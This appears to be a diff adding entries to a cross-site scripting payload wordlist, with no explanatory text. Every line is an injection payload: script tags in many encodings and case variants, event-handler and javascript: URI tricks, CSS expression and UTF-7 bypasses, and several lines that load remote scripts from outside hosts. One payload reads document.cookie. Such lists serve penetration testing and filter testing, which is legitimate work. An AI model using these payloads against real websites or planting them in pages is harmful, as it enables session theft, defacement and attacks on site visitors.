@@ -2,14 +2,68 @@
 -->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
 --></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
 ';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88, 83, 83, 32, 98, 121, 32, 72, 82))//";alert(String.fromCharCode(88, 83, 83, 32, 98, 121, 32, 72, 82))//\";alert(String.fromCharCode(88, 83, 83, 32, 98, 121, 32, 72, 82))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88, 83, 83, 32, 98, 121, 32, 72, 82))</SCRIPT>
+'';!--"<XSS>=&{()}
+')alert('xss');
 " onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+");alert('xss');
+"%3e%3cscript%3ealert('XSS')%3c%2fscript%3e
+"%3e%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e
+"%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+"%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+"%3e%3cscript%3eprompt('XSS')%3c%2fscript%3e
+"%3e%3cScRiPt%3ePrOmPt('XSS')%3c%2fScRiPt%3e
+"%3e%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+"%3e%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+"><0x736372697074>alert('XSS')</0x736372697074>
+"><0x736372697074>alert(String.fromCharCode(88, 83, 83))</0x736372697074>
+"><char(115,99,114,105,112,116)>alert('XSS')</char(115,99,114,105,112,116)>
+"><char(115,99,114,105,112,116)>alert(String.fromCharCode(88, 83, 83))</char(115,99,114,105,112,116)>
+"><h1>XSS DETECTED by HR</h1> .html
+"><script>alert('XSS')</script>
+"><sCRiPt>alert('XSS')</ScRIpT>
+"><ScRiPt>AlErT('XSS')</ScRiPt>
+"><script>alert(String.fromCharCode(88, 83, 83))</script>
+"><script>alert(String.fromCharCode(88, 83, 83)</script>
+"><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+"><script>prompt('XSS')</script>
+"><ScRiPt>PrOmPt('XSS')</ScRiPt>
+"><script>prompt(String.fromCharCode(88, 83, 83)</script>
+"><ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
 ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm( 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
 /</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
 /</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+\";alert('XSS');//
+\\><script>alert('XSS')</script>
+\\><ScRiPt>AlErT('XSS')</ScRiPt>
+\\><script>alert(String.fromCharCode(88, 83, 83)</script>
+\\><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+\\><script>prompt('XSS')</script>
+\\><ScRiPt>PrOmPt('XSS')</ScRiPt>
+\\><script>prompt(String.fromCharCode(88, 83, 83)</script>
+\\><ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+&#34&#62&#60&#115&#99&#114&#105&#112&#116&#62&#97&#108&#101&#114&#116&#40&#39&#88&#83&#83&#39&#41&#60&#47&#115&#99&#114&#105&#112&#116&#62
+&#x22;&#x3E;&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;
 %0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert(test)//'">`
+%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E
+%3Cscript%3alert(document.cookie);%3C%2Fscript%3
+%5c%5c%3e%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e
+%5c%5c%3e%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e
+%5c%5c%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+%5c%5c%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+%5c%5c%3e%3cscript%3eprompt(%5cXSS%5c)%3c%2fscript%3e
+%5c%5c%3e%3cScRiPt%3ePrOmPt(%5cXSS%5c)%3c%2fScRiPt%3e
+%5c%5c%3e%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+%5c%5c%3e%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert('XSS');">
+<? echo('<SCR)';
 </style></scRipt><scRipt>alert(1)</scRipt>
 <</script/script><script ~~~>\u0061lert(1)</script ~~~>
 <</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<0x736372697074>alert('XSS')</0x736372697074>
+<0x736372697074>alert(String.fromCharCode(88, 83, 83))</0x736372697074>
 <a autofocus onfocus=alert(1) href></a>
 <a autofocus onfocusin=alert(1) href></a>
 <a draggable="true" ondrag="alert(1)">test</a>
@@ -638,6 +692,7 @@
 <base draggable="true" ondragenter="alert(1)">test</base>
 <base draggable="true" ondragleave="alert(1)">test</base>
 <base draggable="true" ondragstart="alert(1)">test</base>
+<BASE HREF="javascript:alert('XSS');//">
 <base id=x tabindex=1 onactivate=alert(1)></base>
 <base id=x tabindex=1 onbeforeactivate=alert(1)></base>
 <base id=x tabindex=1 onbeforedeactivate=alert(1)></base><input autofocus>
@@ -848,6 +903,7 @@
 <bgsound onpointerover=alert(1)>XSS</bgsound>
 <bgsound onpointerrawupdate=alert(1)>XSS</bgsound>
 <bgsound onpointerup=alert(1)>XSS</bgsound>
+<BGSOUND SRC="javascript:alert('XSS');">
 <big draggable="true" ondrag="alert(1)">test</big>
 <big draggable="true" ondragend="alert(1)">test</big>
 <big draggable="true" ondragenter="alert(1)">test</big>
@@ -977,6 +1033,7 @@
 <blockquote onpointerover=alert(1)>XSS</blockquote>
 <blockquote onpointerrawupdate=alert(1)>XSS</blockquote>
 <blockquote onpointerup=alert(1)>XSS</blockquote>
+<BODY BACKGROUND="javascript:alert('XSS')">
 <body draggable="true" ondrag="alert(1)">test</body>
 <body draggable="true" ondragend="alert(1)">test</body>
 <body draggable="true" ondragenter="alert(1)">test</body>
@@ -1008,6 +1065,9 @@
 <body onkeydown="alert(1)" contenteditable>test</body>
 <body onkeypress="alert(1)" contenteditable>test</body>
 <body onkeyup="alert(1)" contenteditable>test</body>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<body onLoad="document.location.href='http://google.com'">
+<BODY ONLOAD=alert('XSS')>
 <body onload=alert(1)>
 <body onmessage=alert(1)>
 <body onmousedown="alert(1)">test</body>
@@ -1083,6 +1143,7 @@
 <br onpointerover=alert(1)>XSS</br>
 <br onpointerrawupdate=alert(1)>XSS</br>
 <br onpointerup=alert(1)>XSS</br>
+<BR SIZE="&{alert('XSS')}">
 <button autofocus onfocus=alert(1)>test</button>
 <button autofocus onfocusin=alert(1)>test</button>
 <button draggable="true" ondrag="alert(1)">test</button>
@@ -1255,6 +1316,8 @@
 <center onpointerover=alert(1)>XSS</center>
 <center onpointerrawupdate=alert(1)>XSS</center>
 <center onpointerup=alert(1)>XSS</center>
+<char(115,99,114,105,112,116)>alert('XSS')</char(115,99,114,105,112,116)>
+<char(115,99,114,105,112,116)>alert(String.fromCharCode(88, 83, 83))</char(115,99,114,105,112,116)>
 <cite draggable="true" ondrag="alert(1)">test</cite>
 <cite draggable="true" ondragend="alert(1)">test</cite>
 <cite draggable="true" ondragenter="alert(1)">test</cite>
@@ -2250,6 +2313,10 @@
 <div onpointerover=alert(1)>XSS</div>
 <div onpointerrawupdate=alert(1)>XSS</div>
 <div onpointerup=alert(1)>XSS</div>
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="width: expression(alert('XSS'));">
 <dl draggable="true" ondrag="alert(1)">test</dl>
 <dl draggable="true" ondragend="alert(1)">test</dl>
 <dl draggable="true" ondragenter="alert(1)">test</dl>
@@ -2815,9 +2882,11 @@
 <frameset onpointerover=alert(1)>XSS</frameset>
 <frameset onpointerrawupdate=alert(1)>XSS</frameset>
 <frameset onpointerup=alert(1)>XSS</frameset>
+<frameset rows="100%"><frame noresize="noresize" frameborder ="0" title="XSS Found by HR" src="http://google.com"></frame></frameset>
 <frameset><frame id=x onfocus=alert(1)>
 <frameset><frame id=x onfocusin=alert(1)>
 <frameset><frame onload=alert(1)>
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
 <h1 draggable="true" ondrag="alert(1)">test</h1>
 <h1 draggable="true" ondragend="alert(1)">test</h1>
 <h1 draggable="true" ondragenter="alert(1)">test</h1>
@@ -2861,6 +2930,7 @@
 <h1 onpointerover=alert(1)>XSS</h1>
 <h1 onpointerrawupdate=alert(1)>XSS</h1>
 <h1 onpointerup=alert(1)>XSS</h1>
+<h1>XSS DETECTED by HR</h1> .html
 <head draggable="true" ondrag="alert(1)">test</head>
 <head draggable="true" ondragend="alert(1)">test</head>
 <head draggable="true" ondragenter="alert(1)">test</head>
@@ -2904,6 +2974,7 @@
 <head onpointerover=alert(1)>XSS</head>
 <head onpointerrawupdate=alert(1)>XSS</head>
 <head onpointerup=alert(1)>XSS</head>
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
 <header draggable="true" ondrag="alert(1)">test</header>
 <header draggable="true" ondragend="alert(1)">test</header>
 <header draggable="true" ondragenter="alert(1)">test</header>
@@ -3076,6 +3147,7 @@
 <html onpointerover=alert(1)>XSS</html>
 <html onpointerrawupdate=alert(1)>XSS</html>
 <html onpointerup=alert(1)>XSS</html>
+<HTML><BODY>
 <i draggable="true" ondrag="alert(1)">test</i>
 <i draggable="true" ondragend="alert(1)">test</i>
 <i draggable="true" ondragenter="alert(1)">test</i>
@@ -3167,6 +3239,7 @@
 <iframe onpointerup=alert(1)>XSS</iframe>
 <iframe onreadystatechange=alert(1)></iframe>
 <iframe src=""/srcdoc='<svg onload=alert(1)>'>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
 <iframe/src="data:text/html,<svg onload=alert(1)>">
 <iframe2 draggable="true" ondrag="alert(1)">test</iframe2>
 <iframe2 draggable="true" ondragend="alert(1)">test</iframe2>
@@ -3321,17 +3394,20 @@
 <image3 onpointerover=alert(1)>XSS</image3>
 <image3 onpointerrawupdate=alert(1)>XSS</image3>
 <image3 onpointerup=alert(1)>XSS</image3>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 <img draggable="true" ondrag="alert(1)">test</img>
 <img draggable="true" ondragend="alert(1)">test</img>
 <img draggable="true" ondragenter="alert(1)">test</img>
 <img draggable="true" ondragleave="alert(1)">test</img>
 <img draggable="true" ondragstart="alert(1)">test</img>
+<IMG DYNSRC="javascript:alert('XSS')">
 <img id=x tabindex=1 onactivate=alert(1)></img>
 <img id=x tabindex=1 onbeforeactivate=alert(1)></img>
 <img id=x tabindex=1 onbeforedeactivate=alert(1)></img><input autofocus>
 <img id=x tabindex=1 ondeactivate=alert(1)></img><input id=y autofocus>
 <img id=x tabindex=1 onfocus=alert(1)></img>
 <img id=x tabindex=1 onfocusin=alert(1)></img>
+<IMG LOWSRC="javascript:alert('XSS')">
 <img onafterscriptexecute=alert(1)><script>1</script>
 <img onbeforecopy="alert(1)" contenteditable>test</img>
 <img onbeforecut="alert(1)" contenteditable>test</img>
@@ -3366,15 +3442,35 @@
 <img onpointerup=alert(1)>XSS</img>
 <img src/onerror=alert(1)>
 <img src='1' onerror='alert(0)' <
+<IMG SRC='vbscript:msgbox("XSS")'>
+<IMG SRC=" &#14;  javascript:alert('XSS');">
 <img src="/" =_=" title="onerror='prompt(1)'">
+<IMG SRC="jav	ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS')"
+<IMG SRC="livescript:[code]">
+<IMG SRC="mocha:[code]">
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
 <img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
 <img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);"
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
 <img src=validimage.png onload=alert(1)>
 <img src=validimage.png onloadend=alert(1)>
 <img src=validimage.png onloadstart=alert(1)>
+<img src=x onerror=alert(XSS);>
 <img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
 <img srcset=1 onerror=alert(1)>
 <img srcset=validimage.png onload=alert(1)>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
 <img usemap=#x><map name="x"><area href onfocus=alert(1) id=x>
 <img usemap=#x><map name="x"><area href onfocusin=alert(1) id=x>
 <img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
@@ -3462,6 +3558,7 @@
 <input onpointerrawupdate=alert(1)>XSS</input>
 <input onpointerup=alert(1)>XSS</input>
 <input onselect=alert(1) value="XSS" autofocus>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
 <input type=checkbox id=x onfocus=alert(1)>
 <input type=checkbox id=x onfocusin=alert(1)>
 <input type=image onloadend=alert(1) src=validimage.png>
@@ -3795,6 +3892,7 @@
 <label onpointerover=alert(1)>XSS</label>
 <label onpointerrawupdate=alert(1)>XSS</label>
 <label onpointerup=alert(1)>XSS</label>
+<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
 <legend draggable="true" ondrag="alert(1)">test</legend>
 <legend draggable="true" ondragend="alert(1)">test</legend>
 <legend draggable="true" ondragenter="alert(1)">test</legend>
@@ -3926,6 +4024,8 @@
 <link onpointerrawupdate=alert(1)>XSS</link>
 <link onpointerup=alert(1)>XSS</link>
 <link onreadystatechange=alert(1) rel=stylesheet href=1>
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
 <link rel=stylesheet href=1 onerror=alert(1)>
 <listing draggable="true" ondrag="alert(1)">test</listing>
 <listing draggable="true" ondragend="alert(1)">test</listing>
@@ -4236,6 +4336,13 @@
 <meta draggable="true" ondragenter="alert(1)">test</meta>
 <meta draggable="true" ondragleave="alert(1)">test</meta>
 <meta draggable="true" ondragstart="alert(1)">test</meta>
+<meta http-equiv="accion" content="10"; url="http://google.com" />
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+<META HTTP-EQUIV="Link" Content="<javascript:alert('XSS')>; REL=stylesheet">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
 <meta id=x tabindex=1 onactivate=alert(1)></meta>
 <meta id=x tabindex=1 onbeforeactivate=alert(1)></meta>
 <meta id=x tabindex=1 onbeforedeactivate=alert(1)></meta><input autofocus>
@@ -4618,6 +4725,7 @@
 <noscript onpointerover=alert(1)>XSS</noscript>
 <noscript onpointerrawupdate=alert(1)>XSS</noscript>
 <noscript onpointerup=alert(1)>XSS</noscript>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
 <object data=/ onload=alert(1)>
 <object data=/ onreadystatechange=alert(1)>
 <object draggable="true" ondrag="alert(1)">test</object>
@@ -4664,6 +4772,7 @@
 <object onpointerover=alert(1)>XSS</object>
 <object onpointerrawupdate=alert(1)>XSS</object>
 <object onpointerup=alert(1)>XSS</object>
+<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
 <ol draggable="true" ondrag="alert(1)">test</ol>
 <ol draggable="true" ondragend="alert(1)">test</ol>
 <ol draggable="true" ondragenter="alert(1)">test</ol>
@@ -4707,6 +4816,7 @@
 <ol onpointerover=alert(1)>XSS</ol>
 <ol onpointerrawupdate=alert(1)>XSS</ol>
 <ol onpointerup=alert(1)>XSS</ol>
+<onmouseover="javascript:alert('XSS')">
 <optgroup draggable="true" ondrag="alert(1)">test</optgroup>
 <optgroup draggable="true" ondragend="alert(1)">test</optgroup>
 <optgroup draggable="true" ondragenter="alert(1)">test</optgroup>
@@ -5444,7 +5554,11 @@
 <samp onpointerover=alert(1)>XSS</samp>
 <samp onpointerrawupdate=alert(1)>XSS</samp>
 <samp onpointerup=alert(1)>XSS</samp>
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 <script ~~~>confirm(1)</script ~~~>
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 <script draggable="true" ondrag="alert(1)">test</script>
 <script draggable="true" ondragend="alert(1)">test</script>
 <script draggable="true" ondragenter="alert(1)">test</script>
@@ -5491,10 +5605,35 @@
 <script onpointerrawupdate=alert(1)>XSS</script>
 <script onpointerup=alert(1)>XSS</script>
 <script onreadystatechange=alert(1)></script>
+<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+<SCRIPT SRC=http://google.com></SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
 <script x> alert(1) </script 1=2
 <script x>alert('XSS')<script y>
+<SCRIPT/XSS SRC="http://google.com"></SCRIPT>
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 <script>$=1,\u0061lert($)</script>
 <script>$=1,alert($)</script>
+<SCRIPT>a=/XSS/
+<SCRIPT>alert('XSS');</SCRIPT>
+<script>alert('XSS')</script>
+<sCRiPt>alert('XSS')</ScRIpT>
+<ScRiPt>AlErT('XSS')</ScRiPt>
+<script>alert('Zer0Lulz')</script>
+<script>alert(document.cookie)</script>
+<script>alert(String.fromCharCode(88, 83, 83))</script>
+<script>alert(String.fromCharCode(88, 83, 83)</script>
+<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+<script>document.location='http://google.com'; ',5000</script>
+<script>document.location='http://google.com';</script>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<ScRiPt>PrOmPt('XSS')</ScRiPt>
+<script>prompt('Zer0Lulz')</script>
+<script>prompt(String.fromCharCode(88, 83, 83)</script>
+<ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+<script>var myVar = XSS; alert(myVar)</script>
+<script>window.open( "http://www.google.com/" )</script>
 <section draggable="true" ondrag="alert(1)">test</section>
 <section draggable="true" ondragend="alert(1)">test</section>
 <section draggable="true" ondragenter="alert(1)">test</section>
@@ -6006,6 +6145,8 @@
 <style onpointerrawupdate=alert(1)>XSS</style>
 <style onpointerup=alert(1)>XSS</style>
 <style onreadystatechange=alert(1)></style>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
 <style>:target {color: red;}</style><a id=x style="transition:color 10s" ontransitioncancel=alert(1)></a>
 <style>:target {color: red;}</style><a2 id=x style="transition:color 10s" ontransitioncancel=alert(1)></a2>
 <style>:target {color: red;}</style><abbr id=x style="transition:color 10s" ontransitioncancel=alert(1)></abbr>
@@ -6786,6 +6927,9 @@
 <style>:target {transform: rotate(180deg);}</style><video2 id=x style="transition:transform 2s" ontransitionrun=alert(1)></video2>
 <style>:target {transform: rotate(180deg);}</style><wbr id=x style="transition:transform 2s" ontransitionrun=alert(1)></wbr>
 <style>:target {transform: rotate(180deg);}</style><xmp id=x style="transition:transform 2s" ontransitionrun=alert(1)></xmp>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
 <style>@keyframes slidein {}</style><a style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></a>
 <style>@keyframes slidein {}</style><a style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></a>
 <style>@keyframes slidein {}</style><a2 style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></a2>
@@ -7878,6 +8022,7 @@
 <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><video2 id=x style="position:absolute;" onanimationcancel="alert(1)"></video2>
 <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><wbr id=x style="position:absolute;" onanimationcancel="alert(1)"></wbr>
 <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xmp id=x style="position:absolute;" onanimationcancel="alert(1)"></xmp>
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
 <sub draggable="true" ondrag="alert(1)">test</sub>
 <sub draggable="true" ondragend="alert(1)">test</sub>
 <sub draggable="true" ondragenter="alert(1)">test</sub>
@@ -8074,6 +8219,7 @@
 <svg><set onend=alert(1) attributename=x dur=1s>
 <svg><set onrepeat=alert(1) attributename=x dur=1s repeatcount=2>
 <svg><x><script>alert('1'&#41</x>
+<TABLE BACKGROUND="javascript:alert('XSS')">
 <table draggable="true" ondrag="alert(1)">test</table>
 <table draggable="true" ondragend="alert(1)">test</table>
 <table draggable="true" ondragenter="alert(1)">test</table>
@@ -8910,6 +9056,7 @@
 <wbr onpointerover=alert(1)>XSS</wbr>
 <wbr onpointerrawupdate=alert(1)>XSS</wbr>
 <wbr onpointerup=alert(1)>XSS</wbr>
+<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
 <xmp draggable="true" ondrag="alert(1)">test</xmp>
 <xmp draggable="true" ondragend="alert(1)">test</xmp>
 <xmp draggable="true" ondragenter="alert(1)">test</xmp>
@@ -8957,6 +9104,164 @@
 <xss id=x tabindex=1 onfocus=alert(1)></xss>
 <xss id=x tabindex=1 onfocusin=alert(1)></xss>
 <xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>
+<XSS STYLE="xss:expression(alert('XSS'))">
+='%3e%3c%3cscript%3ealert('XSS')%3c%2fscript%3e
+='%3e%3c%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e
+='%3e%3c%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+='%3e%3c%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+='%3e%3c%3cscript%3eprompt('XSS')%3c%2fscript%3e
+='%3e%3c%3cScRiPt%3ePrOmPt('XSS')%3c%2fScRiPt%3e
+='%3e%3c%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+='%3e%3c%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+='%3e%3cscript%3ealert('XSS')%3c%2fscript%3e
+='%3e%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e
+='%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+='%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+='%3e%3cscript%3eprompt('XSS')%3c%2fscript%3e
+='%3e%3cScRiPt%3ePrOmPt('XSS')%3c%2fScRiPt%3e
+='%3e%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+='%3e%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+='><<script>alert('XSS')</script>
+='><<ScRiPt>AlErT('XSS')</ScRiPt>
+='><<script>alert(String.fromCharCode(88, 83, 83)</script>
+='><<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+='><<script>prompt('XSS')</script>
+='><<ScRiPt>PrOmPt('XSS')</ScRiPt>
+='><<script>prompt(String.fromCharCode(88, 83, 83)</script>
+='><<ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+='><script>alert('XSS')</script>
+='><ScRiPt>AlErT('XSS')</ScRiPt>
+='><script>alert(String.fromCharCode(88, 83, 83)</script>
+='><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+='><script>prompt('XSS')</script>
+='><ScRiPt>PrOmPt('XSS')</ScRiPt>
+='><script>prompt(String.fromCharCode(88, 83, 83)</script>
+='><ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+="%3e%3c%3cscript%3ealert('XSS')%3c%2fscript%3e
+="%3e%3c%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e
+="%3e%3c%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+="%3e%3c%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+="%3e%3c%3cscript%3eprompt('XSS')%3c%2fscript%3e
+="%3e%3c%3cScRiPt%3ePrOmPt('XSS')%3c%2fScRiPt%3e
+="%3e%3c%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+="%3e%3c%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+="%3e%3cscript%3ealert('XSS')%3c%2fscript%3e
+="%3e%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e
+="%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+="%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+="%3e%3cscript%3eprompt('XSS')%3c%2fscript%3e
+="%3e%3cScRiPt%3ePrOmPt('XSS')%3c%2fScRiPt%3e
+="%3e%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+="%3e%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+="><<script>alert('XSS')</script>
+="><<ScRiPt>AlErT('XSS')</ScRiPt>
+="><<script>alert(String.fromCharCode(88, 83, 83)</script>
+="><<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+="><<script>prompt('XSS')</script>
+="><<ScRiPt>PrOmPt('XSS')</ScRiPt>
+="><<script>prompt(String.fromCharCode(88, 83, 83)</script>
+="><<ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+="><script>alert('XSS')</script>
+="><ScRiPt>AlErT('XSS')</ScRiPt>
+="><script>alert(String.fromCharCode(88, 83, 83)</script>
+="><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
